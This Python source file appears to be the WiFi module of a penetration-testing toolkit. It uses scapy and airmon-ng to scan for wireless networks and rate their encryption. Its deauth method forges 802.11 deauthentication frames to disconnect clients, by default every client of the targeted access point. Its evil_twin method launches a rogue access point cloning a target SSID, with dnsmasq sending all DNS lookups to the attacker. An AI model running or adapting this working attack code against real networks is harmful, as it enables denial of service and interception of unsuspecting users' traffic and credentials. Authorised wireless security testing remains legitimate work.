import os
import sys
import subprocess
import threading
import time
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../..'))
from modules.logger import log, save_finding

from scapy.all import *
from scapy.layers.dot11 import (Dot11, Dot11Beacon,
                                 Dot11Elt, Dot11Deauth,
                                 RadioTap)

class WiFiModule:

    def __init__(self, session_id: str,
                 iface: str = "wlan0"):
        self.session_id   = session_id
        self.iface        = iface
        self.networks     = {}
        self.scan_active  = False
        self.deauth_active = False

    # ── Get Monitor Interface ─────────────────────────────────────
    def get_monitor_iface(self) -> str:
        result = subprocess.run(
            ['iwconfig'], capture_output=True, text=True
        )
        for line in result.stdout.split('\n'):
            if 'Monitor' in line:
                return line.split()[0]
        return self.iface

    # ── Enable Monitor Mode ───────────────────────────────────────
    def enable_monitor(self) -> str:
        try:
            subprocess.run(
                ['sudo', 'airmon-ng', 'check', 'kill'],
                capture_output=True
            )
            result = subprocess.run(
                ['sudo', 'airmon-ng', 'start', self.iface],
                capture_output=True, text=True
            )
            mon = self.get_monitor_iface()
            log(self.session_id, "WIFI",
                f"Monitor mode enabled → {mon}")
            return mon
        except Exception as e:
            log(self.session_id, "WIFI",
                f"Monitor mode failed: {e}", "ERROR")
            return self.iface

    # ── Network Scanner ───────────────────────────────────────────
    def _packet_handler(self, pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            try:
                ssid    = pkt[Dot11Elt].info.decode(errors='ignore')
                stats   = pkt[Dot11Beacon].network_stats()
                channel = int(ord(pkt[Dot11Elt:3].info))
                crypto  = stats.get('crypto', set())
                enc     = ', '.join(crypto)

                # Security assessment
                severity = "LOW"
                if 'WEP' in enc:
                    severity = "CRITICAL"
                elif 'WPA' not in enc:
                    severity = "HIGH"

                self.networks[bssid] = {
                    "ssid"    : ssid or "<hidden>",
                    "bssid"   : bssid,
                    "channel" : channel,
                    "crypto"  : enc,
                    "severity": severity
                }
            except Exception:
                pass

    def scan_networks(self, duration: int = 20) -> dict:
        log(self.session_id, "WIFI",
            f"Scanning networks for {duration}s")
        self.networks    = {}
        self.scan_active = True
        mon_iface        = self.enable_monitor()

        # Channel hopper
        stop_hop = threading.Event()
        def hop():
            ch = 1
            while not stop_hop.is_set():
                os.system(
                    f"sudo iwconfig {mon_iface} "
                    f"channel {ch} 2>/dev/null"
                )
                ch = ch % 13 + 1
                time.sleep(0.5)

        hop_thread = threading.Thread(
            target=hop, daemon=True
        )
        hop_thread.start()

        sniff(
            iface=mon_iface,
            prn=self._packet_handler,
            timeout=duration,
            store=False
        )

        stop_hop.set()
        self.scan_active = False

        log(self.session_id, "WIFI",
            f"Scan complete → {len(self.networks)} networks")

        # Save findings
        weak = [n for n in self.networks.values()
                if n['severity'] in ['HIGH', 'CRITICAL']]
        if weak:
            save_finding(
                self.session_id, "WIFI", "weak_networks",
                "HIGH", "Weak WiFi Networks Found",
                f"{len(weak)} networks with weak/no encryption",
                {"networks": list(self.networks.values())}
            )
        else:
            save_finding(
                self.session_id, "WIFI", "networks",
                "INFO", "WiFi Networks Discovered",
                f"{len(self.networks)} networks found",
                {"networks": list(self.networks.values())}
            )
        return self.networks

    # ── Deauth Attack ─────────────────────────────────────────────
    def deauth(self, bssid: str,
               client: str = "FF:FF:FF:FF:FF:FF",
               count: int = 100) -> bool:
        log(self.session_id, "WIFI",
            f"Deauth → {bssid} | client: {client}", "WARNING")

        mon_iface = self.get_monitor_iface()
        self.deauth_active = True

        pkt = (RadioTap() /
               Dot11(addr1=client, addr2=bssid, addr3=bssid) /
               Dot11Deauth(reason=7))

        def _send():
            sent = 0
            while self.deauth_active and sent < count:
                sendp(pkt, iface=mon_iface, verbose=False)
                sent += 1
                time.sleep(0.1)
            log(self.session_id, "WIFI",
                f"Deauth complete → {sent} packets sent")

        t = threading.Thread(target=_send, daemon=True)
        t.start()
        t.join()
        self.deauth_active = False

        save_finding(
            self.session_id, "WIFI", "deauth",
            "HIGH", f"Deauth Attack on {bssid}",
            f"{count} deauth packets sent to {client}",
            {"bssid": bssid, "client": client, "count": count}
        )
        return True

    # ── Evil Twin ─────────────────────────────────────────────────
    def evil_twin(self, ssid: str, channel: int,
                  real_bssid: str) -> dict:
        log(self.session_id, "WIFI",
            f"Evil twin → {ssid} CH:{channel}", "WARNING")

        # Write hostapd config
        hostapd_conf = f"""interface=wlan1
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0"""

        with open('/tmp/evil_twin.conf', 'w') as f:
            f.write(hostapd_conf)

        # Write dnsmasq config
        dnsmasq_conf = """interface=wlan1
dhcp-range=192.168.10.10,192.168.10.100,255.255.255.0,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
address=/#/192.168.10.1"""

        with open('/tmp/evil_twin_dns.conf', 'w') as f:
            f.write(dnsmasq_conf)

        # Start processes
        os.system("ip addr add 192.168.10.1/24 dev wlan1 2>/dev/null")
        ap_proc = subprocess.Popen(
            ['sudo', 'hostapd', '/tmp/evil_twin.conf'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(2)
        dns_proc = subprocess.Popen(
            ['sudo', 'dnsmasq', '-C',
             '/tmp/evil_twin_dns.conf', '--no-daemon'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        save_finding(
            self.session_id, "WIFI", "evil_twin",
            "CRITICAL", f"Evil Twin AP: {ssid}",
            f"Rogue AP broadcasting on CH{channel}",
            {"ssid": ssid, "channel": channel,
             "real_bssid": real_bssid}
        )

        return {
            "ssid"    : ssid,
            "channel" : channel,
            "ap_pid"  : ap_proc.pid,
            "dns_pid" : dns_proc.pid,
            "status"  : "running"
        }

    # ── Full WiFi Run ─────────────────────────────────────────────
    def run_full(self, duration: int = 20) -> dict:
        networks = self.scan_networks(duration)
        return {
            "networks"    : list(networks.values()),
            "total"       : len(networks),
            "weak_count"  : len([
                n for n in networks.values()
                if n['severity'] in ['HIGH', 'CRITICAL']
            ])
        }
